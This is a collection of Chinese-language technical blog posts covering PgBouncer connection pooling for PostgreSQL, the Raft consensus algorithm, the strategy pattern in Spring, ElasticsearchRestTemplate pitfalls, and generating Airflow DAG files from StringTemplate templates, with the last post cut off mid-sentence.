[{"content":"前言 不久前参与了基于编排引擎的应用程序开发，在并发执行大量的短时任务时发现工作流当中任务之间的延迟可能远大于任务执行耗时。翻阅官方文档时发现此编排引擎以“数据库连接饥渴”著称，警告道：对于 MySQL 来说通常不是问题，因为它处理连接的模型是基于线程的，但这对于 PostgreSQL 可能是个问题，因为它的连接处理是基于进程的。\n曾经误以为编排引擎或数据库持有连接池，一方面由于对连接池的初印象来自于客户端 JDBC 连接池，另一方面是由于对于 MySQL 连接器的误解。\n将连接池加入到系统，随后测试发现并发执行任务的性能显著提高，很难不对连接池刮目相看。\n进程，还是线程 The Internals of PostgreSQL 展示了 PostgreSQL/Postgres 多进程架构：\n一个客户端（client）的连接请求由服务进程（server process）分派给一个后台进程（backend process）处理，后台进程从服务进程衍生（fork）而来。\n系统调用 fork 用于创建进程，此处引用 The fork() System Call 的图来简单认识一下：\n众所周知，创建进程的开销通常大于创建线程。Postgres 为什么使用多进程架构？在遥远的过去，线程模型在 Unix 上并不成熟，第一个 Postgres 开发者可能认为进程是比线程更安全、健壮、稳定的选择。\n  进程之间的隔离性强于线程之间的隔离性，一个进程的崩溃通常不会影响其它进程。\n  在现代操作系统上，创建进程与创建线程之间的开销差异比以前小得多。\n  当事务非常短的时候，创建进程的成本是否真的可以忽略不计？What is the point of bouncing 的作者测量了建立连接的耗时：\n 这意味着用“信任”连接到 localhost 平均需要 0.045ms，用 MD5 认证则需要 0.063ms。在网络上，它需要 0.532ms（信任）和 0.745ms（md5）。这听起来可能不多，但考虑到从相对较宽的表中获取单行（宽度，如解释所示：750 字节），使用主键需要 0.03ms，我们突然可以看到连接的开销比从磁盘获取数据要多 20 倍。\n 连接池是否可以减少频繁创建进程的成本？Scaling PostgreSQL with PgBouncer: You May Need a Connection Pooler 的测试结果一目了然：\n上图是直连 Postgres 与使用 PgBouncer 作为连接池之间的 TPS 对比，并发数超过某一阈值之后，直连 Postgres 的性能大幅下降，而使用 PgBouncer 作为连接池非常稳定。\n集中，还是分散 连接池是维护数据库连接的缓存，以便将来的新请求可以重用连接。多路复用是线程池的核心方法之一，正常情况下，虚拟连接（virtual connection）数与物理连接（physical connection）数之比大于 1。\nPgBouncer 并非是客户端连接池，而是是集中式的连接池，处于客户端与数据库的中间层，实际上 PgBouncer 是单线程进程。把客户端与 PgBouncer 的连接称为客户端连接（client connection），再把 PgBouncer 与 Postgres 的连接称为服务端连接（server connection），从打开连接到关闭连接的过程看起来像这样子：\n  客户端连接 PgBouncer，建立客户端连接（认证与授权）。\n  PgBouncer 通过用户名与数据库名从池获取空闲的服务端连接（若没有则创建），随后将服务端连接分配给客户端连接。\n  客户端连接与服务端连接配对完成之后，客户端间接连接了 Postgres（中间件代理）。\n  客户端连接断开时，PgBouncer 不会关闭服务端连接，而是将服务端连接释放到池。\n  在使用 PgBouncer 之前，我遇到的场景之一是每个客户端属于进程，几乎同时请求 Postgres，Postgres 创建大量后台进程，即使这些客户端运行时维护着各自的内嵌连接池，在过多客户端情况下，分散式比集中式池昂贵。分散式面向的是线程，而集中式面向的是进程，前者由于依赖库或框架，有一定的侵入性且无集中控制，后者增加了系统的复杂性，新增了一段延迟（经过中间层）、单点失效、可扩展性等问题。\nPgBouncer 配置 PgBouncer 有三种模式（pool_mode）指定服务端连接何时可以被其它客户端重用。\n  session。客户端断开连接后（关闭会话后），服务端连接被释放回池。\n  transaction。事务完成之后（回滚或者提交执行后），服务端连接被释放回池。不能保证在同一个客户端连接上运行的两个事务将在同一个服务端连接上运行。\n  statement。语句执行完成后，服务端连接被释放回池。在此模式下不允许多语句事务。\n  由于那个编排引擎的所有工作进程依赖 SQLAlchemy 与 Postgres 通信，客户端连接有不容忽视的生命周期（pool_recycle），不止执行流程结点任务的子进程，其它子进程也需要持续保持连接从而做其它事情，所以最佳选择是 transaction。\n除了 pool_mode 以外，在性能调优时值得注意的配置项：\n default_pool_size。每对（用户名，数据库）允许多少个服务端连接。 max_client_conn。允许的最大客户端连接数。  详情请参考 PgBouncer Config。\n连接池与线程池 连接池不是、不属于线程池，两者职责分离。以 MySQL 为例，MySQL 客户端连接池虽然可以减少频繁建立或拆毁连接的开销，但是却对 MySQL 服务端的查询处理能力或负载一无所知；相比之下，MySQL 服务端线程池管理着接受入站并发连接和事务执行的一系列线程。\n旧文已介绍 Java 线程池，部分可类比，此处不再赘述。\n 本文首发于 https://h2cone.github.io\n 参考   Wiki # database connection\n  PostgreSQL Connection Pooling: Part 1 – Pros \u0026amp; Cons\n  为什么 MySQL 使用多线程，而 Oracle 和 PostgreSQL 使用多进程？\n  线程崩溃是否会造成进程崩溃？\n  PostgreSQL Connection Pooling: Part 2 – PgBouncer\n  What is the purpose of session pool_mode in pgbouncer?\n  Managing High Availability in PostgreSQL – Part III: Patroni\n  Pgbouncer最佳实践 之 性能提升篇\n  A.15 MySQL 8.0 FAQ: MySQL Enterprise Thread Pool\n  Scaling the GitLab database\n  ","date":"2022-01-16T23:30:47+08:00","permalink":"https://h2cone.github.io/2022/01/16/connection-pool-0/","title":"连接池的意义"},{"content":"重要的事情 不是对论文的阅读理解，而是受到了动画的启发。\n启发式问题 共识是什么？共识算法的应用场景？\n共识是分布式系统最重要的抽象之一，著名的《Designing Data-Intensive Applications》展示了全景式的分布式系统，其中有一大章探讨一致性与共识的内容。\n 共识问题通常形式化描述如下：一个或多个结点可以提议某些值，由共识算法来决定最终值。\n “通俗理解，共识是让几个结点就某项提议达成一致。例如，多个人同时尝试预订飞机的最后一个座位或剧院中的同一座位，或者尝试使用相同的用户名注册账户，此时可以用共识算法来决定这些不相容的操作之中谁是获胜者。”\n对于本地或共享内存的唯一性问题，直截了当的解决方案是使用锁，但到了分布式系统，复杂度骤然上升，共识可能是唯一可靠的方法。不止于此，共识算法可以应用于分布式系统的一系列问题：\n  可线性化的比较－设置寄存器。寄存器需要根据当前值是否等于输入的参数，来自动决定接下来是否应该设置新值。\n  原子事务提交。数据库需要决定是否提交或中止分布式事务。\n  全序广播。消息系统要决定以何种顺序发送消息。\n  锁与租约。当多个客户端争抢锁或租约时，要决定其中哪一个成功。\n  成员/协调服务。对于失败检测器（例如超时机制），系统要决定结点的存活状态（例如基于会话超时）。\n  唯一性约束。当多个事务在相同的主键上试图井发创建冲突资源时，约束条件要决定哪一个被允许，哪些违反约束因而必须失败。\n  Raft 可能是最易于理解的共识算法，标杆式的实现是 etcd/raft，其它的实现可以在这里找到。\n为什么需要 Leader 或 Primary 或 Master 这类角色的选举？\n向客户端制造了单一服务端点的假象，客户端与系统的通信简化为与单一服务端的通信。\n有一种无主结点数据复制（leaderless replication）声称，如果 w + r \u0026gt; n，则读写的结点中一定包含最新值（n 是副本数，写入需要 w 个结点确认，读取必须至少查询 r 个结点）。如果写入了 w 个结点，则需要读取多于 n - w 个结点保证包含最新值（想象一下 w 个结点与 r 个结点有重叠），因此 r \u0026gt; n - w -\u0026gt; r + w \u0026gt; n，这被称为 Quorum，但现实情况往往更加复杂，不保证一定能读取到最新值。\n为单一 Leader 编写程序可能比采用 Quorum 等其它方法更容易，但是劣势也很明显，例如单点失效发生在唯一的 Leader 身上，那恢复期间服务不可用？客户端可以重试，直到一名新的 Leader 被选举出来；更严重的缺陷是唯一的 Leader 负载过高时，会成为了系统的性能瓶颈。早有耳闻 TiKV 是基于 Raft 的分布式键值对数据库，其扩展方式是通过数据分区与 Raft 组（raft group）。\n如上图所示，数据分布到 3 个分区（Region），每个分区通过 Raft 的数据复制方法得到 3 个数据副本（1 Leader + 2 follower），虽然 Raft 组之间并无一致性的要求，但是优势已经非常明显的了。\nFollower 何时转为 Candidate？Candidate 何时转为 Leader？Leader 何时转为 Follower？\nRaft 集群中的 Server 可以是 Leader，也可以是 Follower，还可以是选举中（Leader 不可用时）的 Candidate。Leader 负责将日志复制到 Followers（一种数据复制方法，名为状态机复制）。Leader 通过发送“心跳”定期通知 Follower 们它的存在。每个 Follower 都有一个倒计时（election timeout），接收到“心跳”时，将重置该倒计时，若没接收到，则转为 Candidate，开始 Leader 选举。\n每个 Server 的 Election timeout 不应是相等或者过于相近，否则容易出现多个 Candidate 同时请求投票的局面，很可能发生 Split vote。\n一旦获得了多数票，Candidate 就能提升为 Leader，所谓多数（majority）等于结点数量除以 2 的结果向下取整，比如 3 / 2 == 1、4 / 2 == 2、5 / 2 == 2。\n结点之间如何通信？允许 Candidates 并发请求投票（request votes）？结点如何响应？\n通常是 RPC，Server 可发送两类消息，一是 RequestVotes，二是 AppendEntries，分别用于 Leader 选举、心跳与日志复制。当然，但是每个 Server 在一个期数（term）最多只能投一票，Candidate 一定会投给自己一票，接收到投票请求的 Follower 最多回应一票。Term 是单调递增的整数变量，在开始 Leader 选举时递增，每个 Server 都维护着各自的 Term。\n一旦发生了 Split vote，由于多个 Candidate 都不能获得多数票（参考上图 4 结点的情景），只能递增 Term，开始新的选举。为了快速的选出 Leader 以提供服务，Election timeout 通常在 150 到 300 毫秒之间，最好运大于广播时间（向一组结点发送请求到接收响应的平均时间）且远小于 MTBF。\n如何解决脑裂？\n虽然某一任期最多只有一位 Leader，但是 Raft 集群可能因为网络分区，分裂成若干子集群。\n上文分析可以知道，少数派无法选举出新 Leader，只有多数派做得到。网络分区修复后，Term 较大的 Leader 会把 Term 较低 的 Leader 赶下台（discovers server with higher term）。\n为什么需要复制日志（replicated log）？\n日志是分布式系统最重要的抽象之一。写日志优先于执行来自客户端的命令，日志先行技术有不少优势，一是追加式更新较快，二是适合增量同步数据，三是满足数据恢复与强一致性要求。\n为什么 Leader 执行来自客户端的命令前先写日志？Leader/Follower 何时提交日志条目？又何时应用数据变更（执行命令）？\n假设不写日志或者先执行一系列命令，当某些命令执行失败了（没有真正持久化这件事客户端不一定知道），那相当于这些命令彻底丢失了；相反，先写日志后执行命令，至少可能发生一件命令已备份（日志条目包含命令）的事件，也就拥有了更强的容错性。值得一提的是，写日志当然也可能失败，退化成与执行来自客户端的命令一样，提示客户端失败或重试。\n如何保证结点之间复制日志的一致性？结点故障、网络分区、不一致时如何恢复？\n有些日志比另一些日志更新（more up-to-date）。Raft 通过比较最后一个日志条目来决定哪个 Server 的日志较新。\n  最后一个日志条目的 term 不等时，term 越大则越新。\n  最后一个日志条目的 term 相等时，日志越长则越新。\n  对于 Server 之间的日志冲突，Raft 倾向于修复较旧的日志，使其与较新的日志保持一致。\n基于 Raft 的系统如何保证可靠性？换言之，如何容错（可用性与一致性）？例如结点故障、网络分区等。\n除了日志一致性、Raft 组、最佳的 Election timeout，如果 Follower 崩溃了，虽然其它 Server 发送消息给 Follower 失败了，但是 Server 会重试，直到 Follower 上线后回应确认消息；如果请求在失败之前已经被考虑，重启的 Follower 将忽略它。\n 本文首发于 https://h2cone.github.io\n 参考的链接   Raft Web Site\n  TiKV # Multi-raft\n  ","date":"2021-10-17T19:00:17+08:00","permalink":"https://h2cone.github.io/2021/10/17/raft-0/","title":"浅谈 Raft"},{"content":"基于多态 假设有一段“分支代码”（片段 1）：\n1 2 3 4 5 6 7 8 9  // 可能的 Case CaseEnum caseEnum = getRandomCase(); if (CaseEnum.AA.equals(caseEnum)) { // ... } else if (CaseEnum.BB.equals(caseEnum)) { // ... } else if (CaseEnum.CC.equals(caseEnum)) { // ... }   其等效代码类似于（片段 2）：\n1 2 3 4 5 6 7 8  // 可能的 Case CaseEnum caseEnum = getRandomCase(); for (CaseHandler handler : caseHandlerFactory.getHandlers()) { if (handler.match(caseEnum)) { handler.handle(); break; } }   当增加分支的时候，片段 1 需要在尾部追加代码，而片段 2 无需变更，前提是片段 2 依赖更多的类。\n注意：片段 2 在最坏情况下的运行时间的增长数量级是 N。\n如何实现？\n（一）CaseHandler。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  public interface CaseHandler { /** * 匹配 Case。 * * @param caseEnum Case 枚举 * @return 是否 */ boolean match(CaseEnum caseEnum); /** * 业务处理。 */ void handle(); }   （二）CaseHandler 实现之一。\n1 2 3 4 5 6 7 8 9 10 11 12  public class AaHandler implements CaseHandler { @Override public boolean match(CaseEnum caseEnum) { return CaseEnum.AA.equals(caseEnum); } @Override public void handle() { // ...  } }   （三）CaseHandler 工厂。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  public class CaseHandlerFactory { /** * handler name to handler */ private final Map\u0026lt;String, CaseHandler\u0026gt; name2Handler; public CaseHandlerFactory() { this.name2Handler = new LinkedHashMap\u0026lt;\u0026gt;(); } public CaseHandlerFactory addHandler(CaseHandler handler) { if (Objects.isNull(handler)) { return this; } name2Handler.put(handler.getClass().getSimpleName(), handler); return this; } public Collection\u0026lt;CaseHandler\u0026gt; getHandlers() { return name2Handler.values(); } }   （四）初始化 CaseHandler 工厂。\n1 2 3 4 5  final CaseHandlerFactory caseHandlerFactory = new CaseHandlerFactory() .addHandler(new AaHandler()) .addHandler(new BbHandler()) .addHandler(new CcHandler()) ;   依赖注入 基于 Spring IoC，自动实例化 CaseHandler 工厂。\n（一）将 CaseHandler 的所有实现声明为 Spring Bean。\n1 2 3 4 5 6 7 8 9 10 11 12 13  @Component public class AaHandler implements CaseHandler { @Override public boolean match(CaseEnum caseEnum) { return CaseEnum.AA.equals(caseEnum); } @Override public void handle() { // ...  } }   （二）CaseHandlerFactory 构造器的依赖注入。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  @Component public class CaseHandlerFactory { /** * handler name to handler */ private final Map\u0026lt;String, CaseHandler\u0026gt; name2Handler; @Autowired public CaseHandlerFactory(Collection\u0026lt;CaseHandler\u0026gt; handlers) { Assert.notNull(handlers, \u0026#34;handlers must not be null\u0026#34;); this.name2Handler = new LinkedHashMap\u0026lt;\u0026gt;(handlers.size()); handlers.forEach(this::addHandler); } public void addHandler(CaseHandler handler) { if (Objects.isNull(handler)) { return; } name2Handler.put(handler.getClass().getSimpleName(), handler); } public Collection\u0026lt;CaseHandler\u0026gt; getHandlers() { return name2Handler.values(); } }   （三）引用 CaseHandlerFactory。\n1 2  @Resource private CaseHandlerFactory caseHandlerFactory;   策略模式 基于 Spring Boot 开发 Web 程序时，有时会遇到需要根据不同的类型或策略（strategy）做不同的事情，例如：\n1 2 3 4 5 6 7 8 9 10 11 12  @RestController @RequestMapping(\u0026#34;/some\u0026#34;) public class SomeController { @Resource private SomeService someService; @PostMapping(\u0026#34;/doSomething\u0026#34;) public ResponseEntity\u0026lt;?\u0026gt; doSomething(@RequestBody Some some) { someService.doSomething(some); return ResponseEntity.ok().build(); } }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  @Service public class SomeService { public void doSomething(Some some) { StrategyEnum strategyEnum = some.getStrategyEnum(); Assert.notNull(strategyEnum, \u0026#34;strategyEnum must not be null\u0026#34;); switch (strategyEnum) { case Strategy1: // ...  break; case Strategy2: // ...  break; case Strategy3: // ...  break; default: // ...  } } }   使用策略模式可以优化过长的“分支代码”。\n Define a family of algorithms, encapsulate each one, and make them interchangeable. Strategy lets the algorithm vary independently from clients that use it.\n 大同小异，编写策略类和策略工厂类。\n（一）所有可能的 Strategy。\n1 2 3 4 5 6 7 8 9  public enum StrategyEnum { Strategy1, Strategy2, Strategy3 // ... }   （二）Strategy 接口。\n1 2 3 4 5 6 7 8 9 10 11 12 13  public interface Strategy { /** * 获取 Strategy 枚举 * * @return Strategy 枚举 */ StrategyEnum getStrategyEnum(); /** * 业务处理 */ void doSomething(); }   （三）Strategy 的其中一个实现。\n1 2 3 4 5 6 7 8 9 10 11 12 13  @Component public class Strategy1 implements Strategy { @Override public StrategyEnum getStrategyEnum() { return StrategyEnum.Strategy1; } @Override public void doSomething() { // ...  } }   （四）Strategy 工厂。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  @Component public class StrategyFactory { private final Map\u0026lt;StrategyEnum, Strategy\u0026gt; strategyMap; @Autowired public StrategyFactory(Collection\u0026lt;Strategy\u0026gt; strategies) { Assert.notNull(strategies, \u0026#34;strategies must not be null\u0026#34;); this.strategyMap = new LinkedHashMap\u0026lt;\u0026gt;(strategies.size()); strategies.forEach((strategy) -\u0026gt; strategyMap.put(strategy.getStrategyEnum(), strategy)); } public Strategy getStrategy(StrategyEnum strategyEnum) { return strategyMap.get(strategyEnum); } }   （五）重写 SomeService。\n1 2 3 4 5 6 7 8 9 10 11 12  @Service public class SomeService { @Resource private StrategyFactory strategyFactory; public void doSomething(Some some) { Strategy strategy = strategyFactory.getStrategy(some.getStrategyEnum()); if (Objects.nonNull(strategy)) { strategy.doSomething(); } } }   注意：获取策略的方法（getStrategy）在最坏情况下的运行时间的增长数量级是 1。\n 本文首发于 https://h2cone.github.io\n 参考资料   Spring Beans and Dependency Injection\n  Strategy Design Pattern with in Spring Boot application.\n  ","date":"2021-08-05T14:37:16+08:00","permalink":"https://h2cone.github.io/2021/08/05/loop_or_strategy/","title":"优化过长的“分支代码”"},{"content":"基于日期的索引 预期单一索引增长速率较快，最终决定创建基于日期的索引（time-based indices），例如按月份分索引：\n1 2 3 4  @Document(indexName = \u0026#34;my_index-#{@timeBasedIndexNameProvider.toMonth()}\u0026#34;, shards = 3) public class Entity { // ... }   其中 indexName 的值可包含 SpEL，引用了 TimeBasedIndexNameProvider 的 toMonth。\n1 2 3 4 5 6 7  @Component(\u0026#34;timeBasedIndexNameProvider\u0026#34;) public class TimeBasedIndexNameProvider { public String toMonth() { return LocalDateTime.now().format(DateTimeFormatter.ofPattern(\u0026#34;yyyy-MM\u0026#34;)); } }   生成的一系列索引名形式如下：\n  my_index-2021-07\n  my_index-2021-08\n  \u0026hellip;\u0026hellip;\n  保存实体时，当前月份的索引可能还未创建，如果直接使用 ElasticsearchRestTemplate 的 save 方法，当前版本并不会解析实体类的实例字段上标注的 Elasticsearch 相关注解，例如有一个字段（batchId）：\n1 2  @Field(type = FieldType.Keyword) private String batchId;   这种情况下，自动创建的 my_index-* 的 Mapping 所包含的 batchId 类型是 Text，而不是预期的 Keyword。一般来说，在保存实体之前，先检测当前月份的索引是否存在，若不存在，则创建索引（包括 Mapping），否则直接保存实体。\n1 2 3 4 5 6 7 8 9  void createIndexAndPutMapping(Class\u0026lt;T\u0026gt; entityClass) { IndexOperations ops = elasticsearchRestTemplate.indexOps(entityClass); if (ops.exists()) { return; } ops.create(); Document mapping = ops.createMapping(entityClass); ops.putMapping(mapping); }   上面的 createIndexAndPutMapping 线程不安全，多线程并发执行该方法时，不仅可能会看到下面的错误信息，而且 my_index-* 的 Mapping 也可能不符合预期。\n1  mapper [batchId] of different type, current_type [text], merged_type [keyword]   既希望各个线程保存实体互不干扰，又不希望同步机制所引起的延迟，那么最好的方案是使用索引模板。\n1 2 3 4 5 6 7 8  boolean putTemplate(Class\u0026lt;T\u0026gt; entityClass, String templateName, String... indexPatterns) { IndexOperations ops = elasticsearchRestTemplate.indexOps(entityClass); PutTemplateRequest request = PutTemplateRequest.builder(templateName, indexPatterns) .withSettings(Document.from(ops.createSettings())) .withMappings(Document.from(ops.createMapping())) .build(); return ops.putTemplate(request); }   构建模板时，指定索引的模式（indexPatterns），这里就是 my_index-*，之后所有名称满足该模式的索引创建时，它们的 Mapping 完全一致。注意，以上方法无需同步机制，但是要求单线程执行，例如在程序启动时由单线程执行 createIndexAndMapping 方法，再由多线程执行 ElasticsearchRestTemplate 的 save 方法。\n实体内容太长 在日志中看到了这样的错误信息：\n1  entity content is too long [499093206] for the configured buffer limit [104857600]   从 HttpAsyncResponseConsumerFactory 可以知道 Elasticsearch 客户端接收响应的缓冲区大小是 100 MB（104857600 bytes），虽然是硬编码，但是已经足够大到覆盖绝大多数场景，不如调查一下是否是业务逻辑代码的缺陷。\n有可能是因为先过滤后聚合的查询没有限制记录条数，可以考虑设置 withPageable。\n1 2 3 4 5 6  NativeSearchQuery query = new NativeSearchQueryBuilder() .withQuery(queryBuilder) .withPageable(PageRequest.of(0, 1)) .addAggregation(aggregationBuilder) .withIndicesOptions(IndicesOptions.lenientExpandOpen()) .build();   分组和排序以及 Top-N 例如，一个先过滤后聚合的查询：\n按某一字段过滤。 按某一字段分组。 组内按某一字段排序。 每组只取前几个。 各组按某一字段排序。  Query DSL 如下所示：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60  { \u0026#34;query\u0026#34;: { \u0026#34;bool\u0026#34;: { \u0026#34;must\u0026#34;: [ { \u0026#34;term\u0026#34;: { \u0026#34;eventId\u0026#34;: { \u0026#34;value\u0026#34;: \u0026#34;AXso-TZMPxhCtoMLAWoN\u0026#34;, \u0026#34;boost\u0026#34;: 1.0 } } } ], \u0026#34;adjust_pure_negative\u0026#34;: true, \u0026#34;boost\u0026#34;: 1.0 } }, \u0026#34;aggs\u0026#34;: { \u0026#34;group-by-batchId\u0026#34;: { \u0026#34;terms\u0026#34;: { \u0026#34;field\u0026#34;: \u0026#34;batchId\u0026#34;, \u0026#34;size\u0026#34;: 10, \u0026#34;min_doc_count\u0026#34;: 1, \u0026#34;shard_min_doc_count\u0026#34;: 0, \u0026#34;show_term_doc_count_error\u0026#34;: false, \u0026#34;order\u0026#34;: [ { \u0026#34;min-createTime\u0026#34;: \u0026#34;asc\u0026#34; }, { \u0026#34;_key\u0026#34;: \u0026#34;asc\u0026#34; } ] }, \u0026#34;aggregations\u0026#34;: { \u0026#34;min-createTime\u0026#34;: { \u0026#34;min\u0026#34;: { \u0026#34;field\u0026#34;: \u0026#34;createTime\u0026#34; } }, \u0026#34;topN\u0026#34;: { \u0026#34;top_hits\u0026#34;: { \u0026#34;from\u0026#34;: 0, \u0026#34;size\u0026#34;: 1, \u0026#34;version\u0026#34;: false, \u0026#34;seq_no_primary_term\u0026#34;: false, \u0026#34;explain\u0026#34;: false, \u0026#34;sort\u0026#34;: [ { \u0026#34;actionStartTime\u0026#34;: { \u0026#34;order\u0026#34;: \u0026#34;asc\u0026#34; } } ] } } } } } }   这里关键在于分组之后，在每一组求用于各组排序的字段的最小值或最大值。\n1 2 3 4 5  MinAggregationBuilder minAggBuilder = AggregationBuilders .min(minAggName) .field(orderByField); termsAggBuilder.order(BucketOrder.aggregation(minAggName, orderByFieldAsc)); termsAggBuilder.subAggregation(minAggBuilder);   字段膨胀 Elasticsearch 限制客户端将过多键值对插入索引。\n1 2 3 4  /** * nodeId to taskId */ private Map\u0026lt;String, String\u0026gt; nodeId2TaskId;   上面是 Object 或者 Nested 的字段，随着插入次数增多，可能遇到异常：\n1  Limit of total fields [1000] in index has been exceeded   如果不需要检索，那么优先考虑将字段类型设置为 Flattened。\n1 2  @Field(type = FieldType.Flattened) private Map\u0026lt;String, String\u0026gt; nodeId2TaskId;    本文首发于 https://h2cone.github.io\n 参考资料   Spring Data Elasticsearch # High Level REST Client\n  Spring Data Elasticsearch - Reference Documentation\n  And the big one said \u0026ldquo;Rollover\u0026rdquo; — Managing Elasticsearch time-based indices efficiently\n  Elasticsearch Guide # Aggregations\n  ","date":"2021-07-26T11:05:02+08:00","permalink":"https://h2cone.github.io/2021/07/26/elasticsearch_rest_template_pitfall/","title":"ElasticsearchRestTemplate 的一些坑"},{"content":"背景 近期，从零开始搭建 SOAR 平台，其中工作流引擎或任务编排组件是核心组件之一。\nAirflow Airflow 是用于描述、执行、监控工作流的平台。目前为止，启动 Airflow 最快的方式是——在 Docker 中运行 Airflow，这种安装方式也有利于可扩展性。\n有一些组件需要说明一下（此处省略 Flower）：\n Webserver：提供访问 DAG、任务、变量、连接等等的状态信息的 Airflow REST API。 Scheduler：负责 DAG 解析与任务调度。 Worker：执行由 Scheduler 分配的任务。 Redis：Scheduler 与 Worker 之间的消息代理。 Postgres：存储有关 DAG、任务、变量、连接等等的状态信息。  上述组件是进程级组件，需要注意的是 DAGs 并不是进程，而是指多个 Python 源文件。DAG 是有向无环图（Directed Acyclic Graph）的缩写，从 Airflow 的角度来看，DAG 用于描述工作流，有向无环图中的结点被称为任务（Task），而 Task 是通过 Operator 来实现。DAGs 的位置在 Airflow 配置文件中指定，重要的事情是 Webserver 和 Scheduler 以及 Worker 都需要读取 DAGs。\n生成 DAG 编写 DAG 需要一定的 Python 知识，甚至 Airflow 并不提供创建 DAG 的 UI 或 REST API。情理之中，Airflow 创建工作流并不包含“无代码”或“低代码”特性，从官方首页可以看到其定位：\n Airflow is a platform created by the community to programmatically author, schedule and monitor workflows.\n 后端满足可视化任务编排需求解决方案之一是通过用户输入生成 DAG 源文件，即生成特定的 Python 源文件。\n模板方法 体验过编写 DAG 或浏览过 DAG 示例之后可以归纳出 DAG 的一般结构：\n  Import Statements（导入语句）\n  Default Arguments（默认参数）\n  DAG Constructor（DAG 构造器）\n  Operators（Operator 构造器）\n  Dependencies（Operator 之间的依赖关系）\n  如果需要一些复杂函数才能满足需求，完全可以将复杂度转移到 Airflow 之外的服务提供者（service provider），例如在 DAG 中使用 HTTP Operators 向服务提供者发送请求，由服务提供者处理请求（具体业务逻辑在服务提供者实现）。\n程序可以根据 DAG 的一般结构，依次追加代码片段。根据关注点分离原则，类似于模型（Model）与视图（View）的分离降低了复杂度，代码片段可分为静态内容和动态内容，前者通常是是样板代码，后者通常是参数值；将静态内容与动态内容合成源代码最便利的工具是模板引擎，而不是重新发明轮子。\n各种编程语言早已有面向 Web 领域的模板引擎，但此处并不需要基于文档树（DOM）生成，因为期望输出不是 HTML 之类的文件，而是 Python 源文件，即纯文本，因而考虑基于字符串的模板引擎，例如 Antlr Project 下的 StringTemplate 4，此介绍非常有助于理解 StringTemplate 4。\n1 2 3 4 5 6 7 8 9  public class User { public int id; // template can directly access via u.id  private String name; // template can\u0026#39;t access this  public User(int id, String name) { this.id = id; this.name = name; } public boolean isManager() { return true; } // u.manager  public boolean hasParkingSpot() { return true; } // u.parkingSpot  public String getName() { return name; } // u.name  public String toString() { return id+\u0026#34;:\u0026#34;+name; } // u }   1 2 3  ST st = new ST(\u0026#34;\u0026lt;b\u0026gt;$u.id$\u0026lt;/b\u0026gt;: $u.name$\u0026#34;, \u0026#39;$\u0026#39;, \u0026#39;$\u0026#39;); st.add(\u0026#34;u\u0026#34;, new User(999, \u0026#34;parrt\u0026#34;)); String result = st.render(); // \u0026#34;\u0026lt;b\u0026gt;999\u0026lt;/b\u0026gt;: parrt\u0026#34;   如何使用 StringTemplate 4 的模板表达式编写 DAG 模板？不妨参考 airflow-up/templates。此处列举一例：\n1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;t.taskId\u0026gt; = SimpleHttpOperator( task_id=\u0026#39;\u0026lt;t.taskId\u0026gt;\u0026#39;, http_conn_id=\u0026#39;\u0026lt;t.httpConnId\u0026gt;\u0026#39;, endpoint=\u0026#39;\u0026lt;t.endpoint\u0026gt;\u0026#39;, method=\u0026#39;\u0026lt;t.method\u0026gt;\u0026#39;, \u0026lt;if(t.data)\u0026gt;data=\u0026#34;{{ dag_run.conf[\u0026#39;\u0026lt;t.taskId\u0026gt;\u0026#39;][\u0026#39;data\u0026#39;] \u0026lt;if(t.dataFilter)\u0026gt;\u0026lt;t.dataFilter\u0026gt;\u0026lt;endif\u0026gt; }}\u0026#34;,\u0026lt;endif\u0026gt; \u0026lt;if(t.headers)\u0026gt;headers=\u0026lt;t.headers\u0026gt;,\u0026lt;endif\u0026gt; \u0026lt;if(t.responseCheck)\u0026gt;response_check=\u0026lt;t.responseCheck\u0026gt;,\u0026lt;endif\u0026gt; \u0026lt;if(t.responseFilter)\u0026gt;response_filter=\u0026lt;t.responseFilter\u0026gt;,\u0026lt;endif\u0026gt; \u0026lt;if(t.extraOptions)\u0026gt;extra_options=\u0026lt;t.extraOptions\u0026gt;,\u0026lt;endif\u0026gt; \u0026lt;if(logResponse)\u0026gt;log_response=\u0026lt;logResponse\u0026gt;,\u0026lt;endif\u0026gt; dag=dag, )   DAG 源文件甚至可以包含 Jinja 表达式（dataFilter 的值选自 Jinja2 内置过滤器，在触发 DAG 运行时，Airflow 渲染 DAG 源文件，并且传递额外配置参数（dag_run.conf）的值。之所以使用 Jinja2，除了 Airflow 天然支持以外，原因之一是业务系统将事件作为请求参数的一部分（额外配置参数）传递给 Webserver 用于触发一个新的 DAG 运行的接口（POST /dags/{dag_id}/dagRuns），因此有些参数没法在生成 DAG 源文件时确定，而只能在运行时确定。\n Note: The parameters from dag_run.conf can only be used in a template field of an operator.\n 原因之二是 SimpleHttpOperator 或 HttpSensor 的构造器对于不同的请求方法（method）要求不同结构的请求参数（data），例如 POST 请求参数要求 JSON，而 GET 请求参数要求 Query String。\nAirflow 官方推荐使用移位运算符定义 Operator 之间的依赖关系。用户提交到后端的流程图（通常是树或有向无环图）定义了结点之间的依赖关系，生成 Operator 之间的依赖关系最直截了当的方式是使用深度搜索列出所有路径。\n每个栈帧都维护一个有序列表（子路径），方法执行过程将结点或 Operator 添加到子路径，递归调用时将子路径元素存入新子路径，循环结束后将子路径添加到主路径。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  void addPathToPaths(List\u0026lt;Node\u0026gt; nodes, List\u0026lt;Node\u0026gt; path) { if (CollectionUtils.isEmpty(nodes)) { return; } for (Node node : nodes) { if (Objects.isNull(node)) { continue; } addNodeToPath(node); List\u0026lt;Node\u0026gt; children = node.getChildren(); if (CollectionUtils.isNotEmpty(children)) { addPathToPaths(children, new ArrayList\u0026lt;\u0026gt;(path)); } } if (CollectionUtils.isNotEmpty(path)) { paths.add(path); } }   DAG 代理 Airflow 的 Scheduler 定期扫描 DAG 目录，发现新 DAG 文件，同时定期解析该目录下的每一个 DAG 文件，两者的频率可通过 min_file_process_interval 和 dag_dir_list_interval 